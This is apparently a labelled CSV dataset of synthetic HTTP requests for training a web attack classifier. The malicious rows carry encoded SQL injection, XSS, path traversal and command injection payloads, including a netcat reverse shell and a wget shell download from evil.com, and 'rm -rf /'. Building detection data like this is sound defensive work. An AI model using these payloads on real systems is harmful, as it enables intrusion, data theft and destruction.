text,label
OPTIONS /js/app.js?tags=987&first_name=%60id%60&page=my+address+is&session=28 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /api/reports?tags=this+is+a+normal+comment&age=937&old_password=983&first_name=I%20%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL--%20attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /api/users?price_max=test+user&new_password=best+regards&password=thank+you&tracking=503&filter=I+would+like+to+order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /api/products lang=admin%20%27%3B%20DROP%20TABLE%20users--%20order&phone=935&password=712 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/users?new_password=hello+world&last_name=11 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /help/faq color=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /api/search?category=804&city=John%20%3Csvg/onload%3Dalert%281%29%3E%20world User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /css/style.css tags=system%20%27%20AND%20%27x%27%3D%27x%20email%40example.com&limit=this+is+a+normal+comment&author=796&sort=123+Main+St&lang=646 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /images/logo.png page=123%20%3Csvg/onload%3Dalert%281%29%3E%20Doe&search_term=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /docs/api status=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&session=hello+world&sort=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /settings?type=contact+me+at+email@example.com&status=%27%3B%20SELECT%20pg_sleep%285%29--&name=my+address+is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /images/logo.png age=123%20%27%20OR%20%271%27%3D%271%27--%20St&password=760 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /help/faq?category=best+regards&new_password=I+would+like+to+order&color=admin+access+request&age=best%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/v2/analytics?price_min=906&q=123+Main+St&search=534&sort=thank+you&action=contact%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /register tag=hello+world&lang=please+find+attached&product_id=best+regards&price_min=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /users/456 status=107&title=my+address+is&columns=my%20....%5C%5C....%5C%5C....%5C%5Cwindows%5C%5Csystem32%20user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /api/v1/data?tag=hello+world&action=475&old_password=120 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /settings?tracking=%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--&name=290&last_name=285&order=939 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /contact last_name=850&author=best+regards&limit=admin+access+request User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /api/v1/data?filters=308&username=123%20%27%20AND%20%27x%27%3D%27x%20St&tag=663 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/orders?email=my+address+is&quantity=I+would+like+to+order&user_id=997&first_name=best+regards&phone=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /docs/api?id=927&type=918 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /api/v1/data?view=175&limit=my%20....//....//....//etc/passwd%20order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /css/style.css?price_max=I%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /dashboard?limit=95&price_min=system+log+entry&category=I+would+like+to+order&password=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /profile status=my+address+is&action=831 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /contact?order=951 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /help/faq?action=this%20%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--%20comment&last_name=748&search_term=system+log+entry&price_min=admin+access+request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /api/orders?view=123%20%60id%60%20email%40example.com&status=my+address+is&filters=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /dashboard age=541&view=John+Doe&tag=this+is+a+normal+comment&content=717 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT /api/products old_password=best+regards&email=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&type=716&status=212 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /docs/api limit=test+user&tag=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&format=my+address+is&type=873&name=I+would+like+to+order User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /images/logo.png?password=%3B%20wget%20http%3A//evil.com/shell.sh&action=contact+me+at+email@example.com&token=John+Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /images/logo.png?id=test+user&filter=thank%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /profile?content=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL-- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /api/products?city=896&format=please+find+attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /api/users?quantity=thank+you&color=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&session=256&comment=hello+world User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /register rating=%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL-- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /posts/789 q=../../../etc/passwd&author=42&id=522&username=contact+me+at+email@example.com&title=please+find+attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /api/orders?sort=contact+me+at+email@example.com&date=573&tracking=707&title=935 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /api/search password=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /posts/789?comment=thank+you&id=system%20%27%20AND%201%3D2--%20you&title=I+would+like+to+order&lang=924 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /api/v1/data?price_min=87 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /images/logo.png product_id=1%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /api/search?product_id=admin%27%23&quantity=please+find+attached&tags=456&last_name=66&tracking=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /login page=254&format=659&price_min=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /contact?date=thank+you&action=hello+world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
HEAD /api/products?limit=I+would+like+to+order&name=best+regards&color=admin+access+request&filters=345 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT /js/app.js old_password=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&date=hello+world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /register limit=I%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /help/faq?rating=300&price_min=356&q=admin%27%23&password=123+Main+St&name=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /login?q=this+is+a+normal+comment&price_max=642&email=please%20%27%3B%20SELECT%20pg_sleep%285%29--%20comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /api/reports?search=system+log+entry&username=85&region=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /help/faq?age=881 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /api/reports?first_name=83&comment=123+Main+St&old_password=please+find+attached User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /dashboard?password=test+user&title=561&q=123+Main+St&search_term=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /api/orders id=745&token=485&password=882 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /contact order_id=my%20..%25252f..%25252f..%25252fetc%25252fpasswd%20regards&password=353&action=my+address+is&username=321&category=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /register id=admin%27/%2A&email=admin+access+request&phone=632&new_password=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /register?last_name=test+user&tracking=John+Doe&columns=please+find+attached&color=648 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /register format=test+user&region=my+address+is&id=admin%201%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users--%20request&last_name=499 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /api/users q=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /api/users?last_name=my+address+is&search=I+would+like+to+order&order=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&page=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /images/logo.png?rating=best+regards&view=....%5C%5C....%5C%5C....%5C%5Cwindows%5C%5Csystem32&comment=thank+you&content=contact+me+at+email@example.com&columns=thank+you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /help/faq?id=379&limit=123+Main+St&price_min=503&email=admin+access+request&view=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /about?page=best+regards&filters=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
POST /help/faq name=123+Main+St&user_id=my+address+is&id=please+find+attached&username=test+user&tracking=thank%20%24%28cat%20/etc/shadow%29%20regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /api/v1/data?rating=%3Csvg/onload%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/orders title=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /api/search content=admin+access+request&color=984&type=thank+you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /about?title=contact+me+at+email@example.com&price_min=%26%20%24%28which%20bash%29%20-c%20%27ls%27 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /profile?q=hello%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20email%40example.com&price_max=please+find+attached User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /register view=283 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /api/search?email=%26%20nc%20-e%20/bin/bash%20evil.com%204444&filters=my+address+is&user_id=system+log+entry&sort=83 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /js/app.js?email=74&name=thank+you&phone=my%20%3Csvg/onload%3Dalert%281%29%3E%20St User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /products/123 search_term=this%20%3Csvg/onload%3Dalert%281%29%3E%20entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /help/faq content=this+is+a+normal+comment&view=343 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /api/users?tags=admin%20%3Bcat%24%7BIFS%7D/etc/passwd%20entry&order_id=832 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /register?comment=thank%20%3Csvg/onload%3Dalert%281%29%3E%20is&region=796 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /dashboard?comment=contact+me+at+email@example.com&city=123+Main+St&category=123%20%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E%20email%40example.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/products?id=system%20%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL--%20user&session=636 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /users/456 title=812&search=814 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /api/search region=thank+you&search=this+is+a+normal+comment&password=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /api/reports?name=787&price_min=my+address+is&tracking=316&new_password=this+is+a+normal+comment&search=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /api/v2/analytics price_min=%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd&last_name=197&session=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /images/logo.png?title=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /help/faq order=system+log+entry&author=system+log+entry&price_min=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST /profile email=791&sort=401 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /about?id=my+address+is&tags=431&filters=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /help/faq?date=165&first_name=best+regards&tracking=hello+world&search_term=this%20%7Cc%27a%27t%20/etc/passwd%20email%40example.com&content=695 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /about?columns=contact+me+at+email@example.com&view=812&user_id=680&order=934&order_id=286 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /api/v1/data?tracking=John+Doe&old_password=266&columns=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&phone=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /docs/api?old_password=my+address+is&q=I+would+like+to+order&email=754&last_name=best%20%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%20is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /register?search_term=353&status=I%20%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E%20attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /help/faq?token=875&phone=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&name=hello+world&status=thank+you&price_min=298 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /about tags=319&region=thank+you&limit=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /contact?action=/var/www/../../etc/passwd&age=thank+you&first_name=this+is+a+normal+comment&password=511 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /register?name=123+Main+St&price_max=admin+access+request&search=I+would+like+to+order User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /api/search?content=system+log+entry&search_term=test+user User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
POST /api/users region=contact%20%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--%20request&comment=123+Main+St User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/reports session=please%20admin%27--%20comment&date=918 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /css/style.css?order_id=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /api/v2/analytics?author=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&color=788 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/v1/data?last_name=please%20%24%28cat%20/etc/shadow%29%20you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /api/search?filter=602&q=788&action=%27%20AND%201%3D1--&age=129 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /settings?city=this+is+a+normal+comment&view=807&date=I+would+like+to+order&q=65&title=858 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /contact?lang=%7C%20cat%20/etc/passwd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /users/456?category=I%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /images/logo.png?price_max=967&comment=705&format=501&search_term=247&content=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /api/search q=878&name=61&token=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT /contact password=my+address+is&new_password=7&tracking=my+address+is&order_id=test+user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /login?sort=481&type=thank+you&region=thank+you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /api/search?city=%3B%20ls%20-la User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /profile sort=%7Cawk%20%27%7Bprint%20%241%7D%27%20/etc/passwd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /css/style.css?token=28&comment=this+is+a+normal+comment&date=this+is+a+normal+comment&id=thank%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20regards&user_id=431 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /users/456?password=327&format=test+user&region=423 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /login lang=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /contact?password=13&rating=thank%20%3B%20rm%20-rf%20/%20is&order=311 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/v2/analytics?type=649&sort=617&color=hello+world&title=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /api/orders author=system%20%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd%20is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /api/orders city=John+Doe&price_min=I+would+like+to+order&user_id=296 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /js/app.js token=807&view=58&type=please+find+attached&author=515 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /images/logo.png?view=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /posts/789 city=12&new_password=hello+world&region=test+user&title=%27%3B%20DROP%20TABLE%20users-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /api/v1/data q=contact+me+at+email@example.com&color=233&price_min=John+Doe&type=280&order_id=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /api/users?last_name=hello%20%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%20regards&color=123+Main+St&type=contact+me+at+email@example.com&password=643 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /api/orders email=251&tag=please+find+attached&date=690&price_max=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /users/456 sort=test%20%27%20AND%20%27x%27%3D%27x%20you&token=168 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /js/app.js?limit=123+Main+St&user_id=contact+me+at+email@example.com&phone=best+regards&status=....%5C%5C....%5C%5C....%5C%5Cwindows%5C%5Csystem32&format=884 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /about?token=my%20admin%27%20OR%20%271%27%3D%271%20comment&email=114 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /api/products?order_id=hello+world&tags=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&content=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /css/style.css?session=39&order_id=John%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20regards User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /api/reports sort=558&type=96&old_password=665&session=493&email=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT /api/users email=609&author=32&product_id=545&format=874 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /about?category=251&tag=%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/products?lang=contact%20%27%20OR%201%3D1--%20regards&product_id=873&tags=I+would+like+to+order&price_min=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /posts/789?date=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /posts/789?new_password=280&tags=system+log+entry&format=990&old_password=%27%3B%20DROP%20TABLE%20users-- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/v2/analytics?price_min=%60id%60 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /js/app.js?order_id=130&first_name=123+Main+St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
OPTIONS /login?first_name=58&comment=582&author=test+user&lang=I%20%27%20AND%20SLEEP%285%29--%20world User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /docs/api category=thank%20%7Cawk%20%27%7Bprint%20%241%7D%27%20/etc/passwd%20St&rating=587&view=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/v1/data region=637&id=John%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20order&action=220&filters=please+find+attached User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /css/style.css search=979 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /posts/789 first_name=123%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /js/app.js color=572&price_min=%27%20AND%201%3D1-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /docs/api price_max=702&first_name=405&name=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&filters=835 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /login filter=207 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /api/orders tag=admin%20%3B%20wget%20http%3A//evil.com/shell.sh%20request User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /settings?rating=John+Doe&status=157&id=%27%20AND%20%27x%27%3D%27x&price_max=331&type=183 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
